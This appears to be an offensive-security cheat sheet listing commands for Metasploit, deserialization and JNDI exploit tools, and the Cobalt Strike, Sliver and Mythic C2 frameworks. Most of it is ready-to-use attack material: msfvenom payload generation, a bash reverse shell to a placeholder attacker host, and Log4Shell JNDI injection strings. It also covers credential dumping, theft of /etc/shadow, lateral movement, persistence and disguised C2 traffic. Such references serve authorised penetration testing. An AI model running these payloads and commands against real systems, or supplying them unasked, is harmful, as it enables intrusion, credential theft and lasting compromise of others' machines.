# Vulnerability Exploitation

_11 tool commands_

### Metasploit  `metasploit`
_Penetration testing framework_

**Step 0**
> Start the Metasploit console
_platform: linux_
```
msfconsole
```

**Step 0**
> Search for relevant exploit modules
_platform: linux_
```
search exploit apache
```
**Syntax breakdown:**
- `search` — Search command _command_
- `exploit` — Module type _value_
- `apache` — Search keyword _value_

**Step 0**
> Select the module to use
_platform: linux_
```
use exploit/multi/handler
```
**Syntax breakdown:**
- `use` — Use-module command _command_
- `exploit/multi/handler` — Module path _value_

**Step 0**
> Show module configuration options
_platform: linux_
```
show options
```
**Syntax breakdown:**
- `show` — Show command _command_
- `options` — Configuration options _value_

**Step 0**
> Set a module parameter
_platform: linux_
```
set RHOSTS 192.168.1.100
```
**Syntax breakdown:**
- `set` — Set-parameter command _command_
- `RHOSTS` — Target host parameter _parameter_

**Step 0**
> Set the payload
_platform: linux_
```
set PAYLOAD windows/meterpreter/reverse_tcp
```
**Syntax breakdown:**
- `PAYLOAD` — Payload parameter _parameter_
- `windows/meterpreter/reverse_tcp` — Meterpreter payload for a reverse TCP connection _value_

**Step 0**
> Run the exploit
_platform: linux_
```
exploit
```
**Syntax breakdown:**
- `exploit` — Run-exploit command _command_

**Step 0**
> Run the exploit in the background
_platform: linux_
```
exploit -j
```
**Syntax breakdown:**
- `-j` — Background job mode _parameter_

**Step 0**
> Use msfvenom to generate a malicious file
_platform: linux_
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe
```
**Syntax breakdown:**
- `msfvenom` — MSF payload generation tool _command_
- `-p` — Specify the payload _parameter_
- `-f exe` — Output format _parameter_
- `-o` — Output file _parameter_

**Step 0**
> Common commands within a Meterpreter session
_platform: linux_
```
sysinfo
getuid
hashdump
```

---

### Searchsploit  `searchsploit`
_Exploit-DB local search tool for finding exploit code offline_

**Step 0**
> Search for exploits by keyword
```
searchsploit apache 2.4
searchsploit wordpress 5.0
```
**Syntax breakdown:**
- `searchsploit` — Exploit-DB local search tool _command_

**Step 0**
> Exact match and keyword exclusion
```
searchsploit -e "Apache Tomcat"
searchsploit --exclude="dos" windows smb
```

**Step 0**
> Copy an exploit to the current directory or show its path
```
searchsploit -m 44228
searchsploit -p 44228
```

**Step 0**
> JSON output format for easy script processing
```
searchsploit -j apache | jq ".RESULTS_EXPLOIT[]"
```

---

### ExploitDB  `exploitdb`
_Online search of the exploit code database_

**Step 0**
> Search for exploit code online
```
# Visit https://www.exploit-db.com
# In the search box, enter: Apache Struts
# Or use a Google Dork:
site:exploit-db.com "Apache Struts" RCE
```

**Step 0**
> Search via the API (requires appropriate request headers)
```
curl "https://www.exploit-db.com/search?q=wordpress+5.0" -H "X-Requested-With: XMLHttpRequest"
```

**Step 0**
> Use the ExploitDB Google Hacking Database
```
# Google Dorks indexed by ExploitDB:
https://www.exploit-db.com/google-hacking-database
# Search for leaked config files, databases, etc.
```

---

### ysoserial  `ysoserial`
_Payload generation tool for Java deserialization exploitation_

**Step 0**
> Generate a deserialization payload using a specified gadget chain
```
java -jar ysoserial.jar CommonsCollections1 "id" | base64
java -jar ysoserial.jar CommonsCollections5 "whoami" > payload.bin
```
**Syntax breakdown:**
- `CommonsCollections1` — Gadget chain name (depends on the target classpath) _parameter_
- `"id"` — System command to execute _value_

**Step 0**
> List all available gadget chains
```
java -jar ysoserial.jar --help
# Common: CommonsCollections1-7, Jdk7u21, URLDNS, JRMPClient
```

**Step 0**
> Remote exploitation via the JRMP protocol
```
# Listener side (attacker machine):
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "bash -c {echo,base64_cmd}|{base64,-d}|{bash,-i}"

# Send the JRMP client payload:
java -jar ysoserial.jar JRMPClient attacker_ip:1099 > jrmp.bin
```

**Step 0**
> Use the URLDNS chain to probe for deserialization vulnerabilities (no dependencies required)
```
java -jar ysoserial.jar URLDNS "http://your_dnslog.com/test" | base64
```

---

### ysoserial.net  `ysoserial-net`
_.NET deserialization payload generation tool_

**Step 0**
> Generate a .NET deserialization payload
_platform: windows_
```
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc" -o base64
```
**Syntax breakdown:**
- `-g` — Gadget chain name _parameter_
- `-f` — Serialization format (BinaryFormatter/ObjectStateFormatter, etc.) _parameter_
- `-c` — Command to execute _parameter_
- `-o base64` — Base64-encoded output _parameter_

**Step 0**
> Forge an ASP.NET ViewState to execute a command
_platform: windows_
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg=SHA1 --validationkey=MACHINE_KEY --generator=GENERATOR
```

**Step 0**
> List all available gadget chains and formats
_platform: windows_
```
ysoserial.exe -l
# Common: TextFormattingRunProperties, TypeConfuseDelegate, PSObject
```

---

### Marshalsec  `marshalsec`
_Java deserialization exploitation tool supporting multiple marshal formats and JNDI injection_

**Step 0**
> Start a malicious LDAP server for JNDI injection (Log4Shell, etc.)
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker_ip:8888/#Exploit" 1389
```
**Syntax breakdown:**
- `LDAPRefServer` — Start an LDAP reference server _command_
- `"http://attacker_ip:8888/#Exploit"` — URL hosting the malicious class file _value_
- `1389` — LDAP service listening port _value_

**Step 0**
> Start a malicious RMI server
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://attacker_ip:8888/#Exploit" 1099
```

**Step 0**
> Full exploitation chain combined with Log4j2 RCE
```
# 1. Compile the malicious class: javac Exploit.java
# 2. Host the class: python3 -m http.server 8888
# 3. Start LDAP: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ip:8888/#Exploit" 1389
# 4. Trigger: ${jndi:ldap://ip:1389/Exploit}
```

---

### JNDIExploit  `jndi-exploit`
_JNDI injection exploitation tool integrating multiple gadgets and bypasses_

**Step 0**
> Start the JNDI Exploit service (listens on LDAP 1389 and HTTP 3456 simultaneously)
```
java -jar JNDIExploit.jar -i attacker_ip
```
**Syntax breakdown:**
- `-i` — Attacker machine IP address _parameter_

**Step 0**
> Execute commands or spawn a reverse shell via different routes
```
# Trigger payload:
${jndi:ldap://attacker_ip:1389/Basic/Command/Base64/Y21k}
${jndi:ldap://attacker_ip:1389/Basic/ReverseShell/attacker_ip/4444}
```

**Step 0**
> Bypass the trustURLCodebase restriction in newer JDK versions
```
# Use Tomcat Bypass:
${jndi:ldap://attacker_ip:1389/TomcatBypass/Command/Base64/d2hvYW1p}
# Use deserialization Bypass:
${jndi:ldap://attacker_ip:1389/Deserialization/CommonsCollections5/Command/Base64/d2hvYW1p}
```

---

### Rogue JNDI  `rogue-jndi`
_Malicious JNDI server providing multiple attack vectors_

**Step 0**
> Start the malicious JNDI service (LDAP+RMI+HTTP)
```
java -jar RogueJndi.jar --command "whoami" --hostname attacker_ip
```

**Step 0**
> Configure a reverse shell command
```
java -jar RogueJndi.jar --command "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" --hostname attacker_ip
```

**Step 0**
> Inject a JNDI lookup into the target to trigger exploitation
```
# LDAP: ${jndi:ldap://attacker_ip:1389/o=reference}
# RMI: ${jndi:rmi://attacker_ip:1099/o=reference}
```

---

### Cobalt Strike  `cobalt-strike`
_Commercial red-team C2 framework supporting many attack and post-exploitation features_

**Step 0**
> Start the CS team server
_platform: linux_
```
./teamserver your_ip your_password malleable_c2_profile.profile
```

**Step 0**
> Generate various payloads through the GUI
```
# GUI operations:
# Attacks > Packages > Windows Executable (S)
# Attacks > Packages > HTML Application
# Attacks > Web Drive-by > Scripted Web Delivery
```

**Step 0**
> Common post-exploitation commands after obtaining a Beacon
_platform: windows_
```
# Basic information
whoami
shell ipconfig
getuid

# Lateral movement
jump psexec target_ip SMB_listener
jump winrm target_ip HTTP_listener

# Credential harvesting
hashdump
logonpasswords

# Persistence
persist-service
persist-registry
```

**Step 0**
> Use a Malleable C2 profile to disguise communication traffic
_platform: linux_
```
# Use a C2 profile to disguise traffic:
# https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver ip pass jquery-c2.4.0.profile
```

---

### Sliver  `sliver`
_Open-source cross-platform red-team C2 framework, a Cobalt Strike alternative_

**Step 0**
> Start the Sliver server
_platform: linux_
```
sliver-server
```

**Step 0**
> Generate implants for various platforms
```
# In the Sliver console:
generate --mtls attacker_ip --os windows --arch amd64 --save implant.exe
generate --http attacker_ip --os linux --format shared --save implant.so
```

**Step 0**
> Start an mTLS/HTTPS/WireGuard listener
```
mtls -l 8888
https -l 443 -d example.com
wg -l 51820
```

**Step 0**
> Common post-exploitation operation commands
```
# After obtaining a session:
info
getuid
ps
download /etc/shadow
upload local_file /tmp/remote
execute -o whoami
pivots tcp --bind 0.0.0.0:9050
```

---

### Mythic  `mythic`
_Modular C2 framework supporting multiple agents and custom extensions_

**Step 0**
> Install the Apollo (Windows) or Poseidon (Linux) agent
_platform: linux_
```
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
sudo ./mythic-cli install github https://github.com/MythicAgents/Poseidon
```

**Step 0**
> Manage C2 operations through the web interface
```
https://attacker_ip:7443
# Default account: mythic_admin
# View the password: cat .env | grep MYTHIC_ADMIN_PASSWORD
```

**Step 0**
> Configure and generate payloads through the GUI
```
# In the web interface:
# 1. Create a Payload Profile
# 2. Select the agent type (Apollo/Poseidon, etc.)
# 3. Configure the C2 Profile
# 4. Generate and download the payload
```

---
